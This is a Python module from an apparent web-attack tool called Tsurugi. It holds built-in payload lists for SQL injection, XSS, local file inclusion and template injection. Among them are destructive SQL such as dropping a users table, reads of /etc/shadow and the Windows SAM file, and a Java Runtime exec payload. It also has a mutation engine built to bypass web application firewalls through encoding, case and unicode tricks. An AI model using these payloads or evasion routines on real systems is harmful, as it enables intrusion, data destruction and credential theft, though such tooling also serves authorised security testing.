# HikariSystem Tsurugi/core/payloads.py
"""
PAYLOAD ENGINE - Dynamic payload loading and mutation.
Integrates with SecLists and provides context-aware payload generation.

Features:
- Lazy loading from wordlists (no 10k payloads in memory)
- Mutation engine (encoding chains, case variations)
- Context-specific generators (SQL, XSS, LFI, SSTI)
- WAF bypass mutations
"""
import os
import random
import urllib.parse
from typing import Generator, List, Optional, Dict, Callable
from dataclasses import dataclass
from pathlib import Path
from core.ui import log_info, log_warning


# ═══════════════════════════════════════════════════════════════════════════════
#  WORDLIST PATHS (SecLists integration)
# ═══════════════════════════════════════════════════════════════════════════════

# Default paths for SecLists
SECLISTS_PATHS = [
    "/usr/share/seclists",
    "/opt/seclists",
    "C:\\seclists",
    os.path.expanduser("~/seclists"),
    os.path.expanduser("~/.seclists"),
]

WORDLIST_PATHS = {
    "sqli": [
        "Fuzzing/SQLi/Generic-SQLi.txt",
        "Fuzzing/SQLi/quick-SQLi.txt",
        "Fuzzing/Databases/MySQL.txt",
        "Fuzzing/Databases/MSSQL.txt",
    ],
    "xss": [
        "Fuzzing/XSS/XSS-Jhaddix.txt",
        "Fuzzing/XSS/XSS-BruteLogic.txt",
        "Fuzzing/XSS/xss-payload-list.txt",
    ],
    "lfi": [
        "Fuzzing/LFI/LFI-Jhaddix.txt",
        "Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
        "Fuzzing/LFI/LFI-gracefulsecurity-windows.txt",
    ],
    "ssti": [
        "Fuzzing/template-engines-expression.txt",
        "Fuzzing/template-engines-special-vars.txt",
    ],
    "dirs": [
        "Discovery/Web-Content/raft-medium-directories.txt",
        "Discovery/Web-Content/common.txt",
    ],
}


def find_seclists() -> Optional[str]:
    """Find SecLists installation path."""
    for path in SECLISTS_PATHS:
        if os.path.isdir(path):
            return path
    return None


def load_wordlist(category: str, max_lines: int = 5000) -> List[str]:
    """
    Load payloads from SecLists wordlists.
    Falls back to built-in if SecLists not found.
    """
    seclists = find_seclists()
    payloads = []
    
    if seclists and category in WORDLIST_PATHS:
        for rel_path in WORDLIST_PATHS[category]:
            full_path = os.path.join(seclists, rel_path)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                        for i, line in enumerate(f):
                            if i >= max_lines:
                                break
                            line = line.strip()
                            if line and not line.startswith('#'):
                                payloads.append(line)
                except Exception:
                    pass
    
    # Fall back to built-in if no external found
    if not payloads:
        payloads = BUILTIN_PAYLOADS.get(category, [])
        if not payloads:
            log_warning(f"No payloads found for '{category}'. Install SecLists for better coverage.")
    
    return payloads


def stream_wordlist(category: str) -> Generator[str, None, None]:
    """
    Stream payloads from wordlist (lazy loading).
    Memory efficient for large wordlists.
    """
    seclists = find_seclists()
    
    if seclists and category in WORDLIST_PATHS:
        for rel_path in WORDLIST_PATHS[category]:
            full_path = os.path.join(seclists, rel_path)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                yield line
                except Exception:
                    pass
    
    # Fall back to built-in
    for payload in BUILTIN_PAYLOADS.get(category, []):
        yield payload


# ═══════════════════════════════════════════════════════════════════════════════
#  BUILT-IN PAYLOADS (fallback)
# ═══════════════════════════════════════════════════════════════════════════════

BUILTIN_PAYLOADS = {
    "sqli": [
        # Classic
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
        "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "admin'--", "admin' #", "admin'/*",
        "') OR ('1'='1", "')) OR (('1'='1",
        # Union
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "1 UNION SELECT 1,2,3--",
        # Time-based
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--", "' AND SLEEP(5)#",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        # Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        # Stacked
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        # Boolean
        "' AND '1'='1", "' AND '1'='2",
        "' AND 1=1--", "' AND 1=2--",
        # Null byte
        "' OR 1=1%00", "admin'%00",
        # Comment variations
        "' OR '1'='1' -- ", "' OR '1'='1' #",
        "' OR '1'='1' /*", "' OR 1=1 -- -",
    ],
    "xss": [
        # Basic
        "<script>alert(1)</script>", "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>", "<img/src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        # Event handlers
        "<div onmouseover=alert(1)>hover</div>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        # Polyglots
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
        "'\"--></style></script><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        # Attribute breaking
        "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        # JavaScript context
        "';alert(1)//", "\";alert(1)//",
        "</script><script>alert(1)</script>",
        # URL context
        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
        # Template literals
        "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
        # Encoded
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        # SVG
        "<svg><animate onbegin=alert(1)>",
        "<svg><set onbegin=alert(1)>",
    ],
    "lfi": [
        # Basic traversal
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..\\..\\..\\etc\\passwd", "..%2f..%2f..%2fetc/passwd",
        # Null byte (PHP < 5.3.4)
        "../../../etc/passwd%00", "../../../etc/passwd\x00",
        # Double encoding
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        # Wrapper bypass
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "file:///etc/passwd",
        "expect://id",
        # Windows
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "C:\\Windows\\win.ini",
        # Common files
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/proc/self/environ", "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "../../../../../../etc/passwd",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{7*'7'}}", "{{config}}", "{{self}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "%{7*7}", "{7*7}",
    ],
}


# ═══════════════════════════════════════════════════════════════════════════════
#  MUTATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class MutationConfig:
    """Configuration for payload mutations."""
    url_encode: bool = True
    double_encode: bool = True
    case_variation: bool = True
    null_byte: bool = True
    comment_injection: bool = True
    unicode: bool = True
    max_mutations: int = 5


def mutate_payload(payload: str, config: MutationConfig = None) -> Generator[str, None, None]:
    """
    Generate mutations of a payload for WAF bypass.
    Yields original first, then mutations.
    """
    if config is None:
        config = MutationConfig()
    
    yield payload  # Original first
    
    mutations_count = 0
    
    # URL encoding
    if config.url_encode and mutations_count < config.max_mutations:
        yield urllib.parse.quote(payload)
        mutations_count += 1
    
    # Double URL encoding
    if config.double_encode and mutations_count < config.max_mutations:
        yield urllib.parse.quote(urllib.parse.quote(payload))
        mutations_count += 1
    
    # Case variations (for SQL keywords)
    if config.case_variation and mutations_count < config.max_mutations:
        # Random case
        mutated = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        if mutated != payload:
            yield mutated
            mutations_count += 1
    
    # Null byte injection
    if config.null_byte and mutations_count < config.max_mutations:
        yield payload + "%00"
        yield payload + "\x00"
        mutations_count += 2
    
    # Comment injection (SQL)
    if config.comment_injection and mutations_count < config.max_mutations:
        # Inline comments between keywords
        for keyword in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]:
            if keyword in payload.upper():
                commented = payload.replace(keyword, f"/**/{''.join([c + '/**/' for c in keyword])}")
                yield commented
                mutations_count += 1
                break
    
    # Unicode bypass
    if config.unicode and mutations_count < config.max_mutations:
        # Common unicode alternatives
        replacements = {
            "<": "\uff1c", ">": "\uff1e",
            "'": "\u2019", '"': "\u201d",
            "/": "\u2215", "\\": "\u2216",
        }
        mutated = payload
        for char, replacement in replacements.items():
            mutated = mutated.replace(char, replacement)
        if mutated != payload:
            yield mutated


def generate_sqli_payloads(count: int = 100, mutate: bool = True) -> Generator[str, None, None]:
    """Generate SQLi payloads with optional mutations."""
    base_payloads = load_wordlist("sqli", max_lines=count)
    
    for payload in base_payloads:
        if mutate:
            for mutated in mutate_payload(payload, MutationConfig(max_mutations=3)):
                yield mutated
        else:
            yield payload


def generate_xss_payloads(context: str = "html", count: int = 100) -> Generator[str, None, None]:
    """
    Generate context-aware XSS payloads.
    
    Args:
        context: html, attribute, javascript, url
        count: Max base payloads
    """
    base = load_wordlist("xss", max_lines=count)
    
    # Context-specific prefixes/suffixes
    wrappers = {
        "html": [("", ""), ("-->", "<!--"), ("</script>", "<script>")],
        "attribute": [("\" ", ""), ("' ", ""), ("\" onmouseover=\"", "")],
        "javascript": [("';", "//"), ("\";", "//"), ("*/", "/*")],
        "url": [("javascript:", ""), ("data:text/html,", "")],
    }
    
    for payload in base:
        yield payload
        
        # Apply context wrappers
        for prefix, suffix in wrappers.get(context, []):
            yield f"{prefix}{payload}{suffix}"


def generate_lfi_payloads(os_type: str = "linux", count: int = 100) -> Generator[str, None, None]:
    """
    Generate OS-specific LFI payloads.
    
    Args:
        os_type: linux, windows, both
        count: Max base payloads
    """
    base = load_wordlist("lfi", max_lines=count)
    
    for payload in base:
        # Filter by OS
        if os_type == "linux" and "\\" in payload:
            continue
        if os_type == "windows" and "/etc/" in payload:
            continue
        
        yield payload
        
        # Depth variations
        for depth in range(3, 10):
            if payload.startswith("../"):
                yield "../" * depth + payload.lstrip("../")
            elif payload.startswith("..\\"):
                yield "..\\" * depth + payload.lstrip("..\\")


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD STATISTICS
# ═══════════════════════════════════════════════════════════════════════════════

def get_payload_stats() -> Dict[str, int]:
    """Get statistics about available payloads."""
    seclists = find_seclists()
    stats = {"seclists_found": seclists is not None}
    
    for category in BUILTIN_PAYLOADS.keys():
        payloads = load_wordlist(category, max_lines=100000)
        stats[category] = len(payloads)
    
    return stats


def print_payload_stats():
    """Print payload statistics to console."""
    from core.ui import console
    from rich.table import Table
    
    stats = get_payload_stats()
    
    table = Table(title="Payload Arsenal")
    table.add_column("Category", style="cyan")
    table.add_column("Count", style="green")
    table.add_column("Source", style="dim")
    
    seclists = "SecLists" if stats["seclists_found"] else "Built-in"
    
    for category in ["sqli", "xss", "lfi", "ssti"]:
        count = stats.get(category, 0)
        table.add_row(category.upper(), str(count), seclists)
    
    console.print(table)
